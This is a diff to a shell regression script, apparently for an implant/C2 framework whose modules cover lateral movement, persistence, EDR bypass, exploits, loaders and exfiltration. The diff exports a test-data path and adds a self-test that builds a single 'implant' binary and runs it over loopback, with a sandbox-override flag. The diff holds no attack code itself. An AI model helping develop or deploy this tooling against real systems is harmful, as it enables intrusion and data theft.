@@ -79,12 +79,43 @@ run_py() {
     fi
 }
 
+# huffman 交叉验证的用例文件在源码树里（24_front/tests/data/hf_cases.txt）。
+# 不导出的话 test_huffman 会回退到 /tmp/hf_cases.txt，该文件在干净环境里
+# 不存在，于是返回 77 被记成 SKIP —— 表面不失败，实际这条验证从没跑过。
+# 显式导出，让它真正参与回归。
+export HF_CASES="$ROOT/24_front/tests/data/hf_cases.txt"
+
 for m in 00_crypto 01_proto 02_c2 03_transport 04_agent 05_server 06_db 07_ui \
          08_lateral 09_persistence 10_evasion 11_edr_bypass 12_exploit \
          14_p2p 16_initial_access 17_loader 18_privilege 19_defense 20_packer \
          21_exfil 22_kern 23_lkm 24_front 25_tls agent_windows; do
     run_c "$m"
 done
+
+# 单体植入体：全仓唯一"把所有能力链进同一个可部署二进制"的验证。
+# 形态与 run_c 的 test_* 不同（单个可执行 + --selftest），故单独处理。
+#
+# selftest 走真实 TCP 双进程：子进程 = 服务端，父进程 = 植入体，两者经
+# 环回 TCP 完成握手 -> 任务通道 -> 采集回传。服务端 stdout/stderr 写文件
+# 而不是继承管道，因此不会让回归脚本等 EOF 挂起。
+run_mono() {
+    printf "=== %-16s " "monolith"
+    if ! (cd "$ROOT/monolith" && timeout 300 make >/tmp/mk_monolith.log 2>&1); then
+        echo "BUILD FAIL"; tail -5 /tmp/mk_monolith.log
+        failed=$((failed+1)); return
+    fi
+    # --run-ms 必须有界：无上界时若帧被去重跳过，循环永不退出。
+    # --budget 给足：默认预算下 3 秒窗口累积不足 1 个覆盖信元，
+    # 覆盖恒为 0 是预算与时长的正常关系而非缺陷，但那样就测不到覆盖路径。
+    if (cd "$ROOT/monolith" && timeout 120 ./implant --selftest --run-ms 3000 \
+            --budget 307200 --allow-sandbox >/tmp/t_monolith.log 2>&1); then
+        echo "PASS"; passed=$((passed+1))
+    else
+        echo "FAIL"; tail -12 /tmp/t_monolith.log
+        failed=$((failed+1))
+    fi
+}
+run_mono
 
 run_int integration \
     -I03_transport/include -I10_evasion/include -I06_db/include -I07_ui/include \
